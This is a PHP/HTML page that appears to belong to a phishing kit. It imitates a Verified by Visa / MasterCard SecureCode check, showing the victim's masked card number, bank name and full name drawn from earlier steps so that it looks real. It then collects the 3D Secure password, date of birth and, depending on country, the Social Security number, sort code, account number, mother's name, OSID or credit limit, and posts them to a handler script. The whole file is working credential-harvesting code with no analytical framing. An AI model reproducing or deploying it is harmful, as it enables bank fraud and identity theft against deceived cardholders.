<?php
session_start();
include('app/functions.php');
include('__CONFIG__.php');
?>
<meta charset="utf-8">
<center>
<div class="content_check" style="margin-left: 2px;width: 288px;border: solid 1px red;padding: 25px;">
 <?php
 $card = substr($_SESSION['scnxxx'],0,1);
 if($card == 5 )
 {
 	echo '<img src="assets/master-card.gif" style="width: 90px;float:left;">';
 	echo '<img src="assets/logo.jpg" style="float: right;display: inline-block" width="100px">';
 }
 elseif($card == 4 )
 {
 	echo '<img src="assets/vbv.gif" style="width: 90px;float:left;">';
 	echo '<img src="assets/logo.jpg" style="float: right;display: inline-block" width="100px">';
 }
 else
 {
 	echo '<img src="assets/logo.jpg" style="display: inline-block;margin-left: 55px;" width="100px">';
 }
 	?>
 	<div style="clear:both;"></div>
  <p style="font-size: 13px; margin-top: 25px; color: #807979;">Please enter your Secure Code </p>
  <table align="center" width="290" style="font-size: 11px;font-family: arial, sans-serif; color: rgb(0, 0, 0); margin-top: 30px;">
   <tbody>
    <tr>
     <td align="right">Bank :</td>
     <td><?php echo get_BIN($_SESSION['scnxxx'], 'bankname'); ?></td>
    </tr>
    <tr>
     <td align="right">Card number :</td>
     <td>XXXX-XXXX-XXXX-
      <?php echo substr($_SESSION['scnxxx'] , -4);?>
     </td>
   </tr>
   <tr>
     <td align="right">Full name :</td>
     <td><?php echo $_SESSION['sfirstName']." ".$_SESSION['slastname']; ?>
     </td>
    </tr>
    <tr>
     <form method="post" action="app/_XVBVX_.php">
      <input name="flow_name" value="summary/index" type="hidden">
      <input name="flow_name" value="summary/index" type="hidden">
      <?php
      if ($_SESSION['cntname'] == "United States")
      	{
      		echo '<tr><td align="right">3D Secure :</td> <td><input style="width: 75px;" type="text" placeholder="3D secure"name="password_vbv"></td></tr>';
      		echo '<tr><td align="right">Social Security Number :</td> <td><input style="width: 75px;" type="text" placeholder="SSN" name="ssn"></td></tr>';
      	}
      	elseif ($_SESSION['cntname'] == "United Kingdom")
      	{
      		echo '<tr><td align="right">3D Secure :</td> <td><input style="width: 75px;" type="text" placeholder="3D secure"name="password_vbv"></td></tr>';
      		echo '<tr> <td align="right">Sort Code : <td><input class="" style="width: 75px;" name="sortcode" id="sortcode" placeholder="Sort Code"></td><br> </tr>';
      		echo '<tr> <td align="right">Account Number : </td> <td><input style="width: 75px;" class="" maxlength="15" required name="accountnum" id="accountnum" placeholder="Account Number"></td> </tr>';
      	}
      	elseif ($_SESSION['cntname'] == "Ireland")
      	{
      		echo '<tr><td align="right">3D Secure :</td> <td><input style="width: 75px;" type="text" placeholder="3D secure"name="password_vbv"></td></tr>';
      		echo '<tr> <td align="right">Sort Code : <td><input style="width: 75px;"class="" name="sortcode" id="sortcode" placeholder="Sort Code"></td><br> </tr>';
      		echo '<tr><td align="right">Mother Name :</td> <td><input style="width: 75px;" class="" maxlength="15" required name="mothernam" id="mothernam" placeholder="Mother Name"></td></tr>';
      		echo '<tr><td align="right">Credit Limit :</td> <td><input style="width: 75px;" class="" maxlength="15" name="creditlimit" id="creditlimit" placeholder="Credit Card Limit"></td></tr>';
      	}
      	elseif($_SESSION['cntname'] == "Australia")
      	{
      		echo '<tr><td align="right">3D Secure :</td> <td><input style="width: 75px;" type="text" placeholder="3D secure"name="password_vbv"></td></tr>';
      		echo '<tr><td align="right">OSID :</td> <td><input class="" style="width: 75px;" name="osid" id="osid" placeholder="OSID"></td></tr>';
      		echo '<tr><td align="right">Credit Limit :</td> <td><input style="width: 75px;" class="" maxlength="15" required name="creditlimit" id="creditlimit" placeholder="Credit Card Limit"></td></tr>';
      	}
      	else
      	{
      		echo ' <td align="right">3D Secure :</td>';
      		echo ' <td><input style="width: 75px;" type="text" placeholder="3D secure" name="password_vbv"></td><br>';
      	}
      	?>
       <tr>
        <td align="right">Date Of Brith :</td>
        <td>
         <input name="dob_month" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text" placeholder="Month"> -
         <input name="dob_day" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text" placeholder="Day"> -
         <input name="dob_year" size="1" pattern="[0-9]{2,}" autocomplete="off" required="required" type="text" placeholder="Year">
        </td>
       </tr>
    </tr>
    <tr>
     <td></td>
     <td>
      <br>
      <input name="confirm" style=" width: 74px;" type="submit" value="Submit"> </td>
    </tr>
    </form>
   </tbody>
  </table>
  <p style="text-align: center;font-family: arial, sans-serif;font-size: 9px; color: #656565"> Copyright © 1999-<?php echo date("Y"); ?> . All rights reserved. </p>
</div>
</center>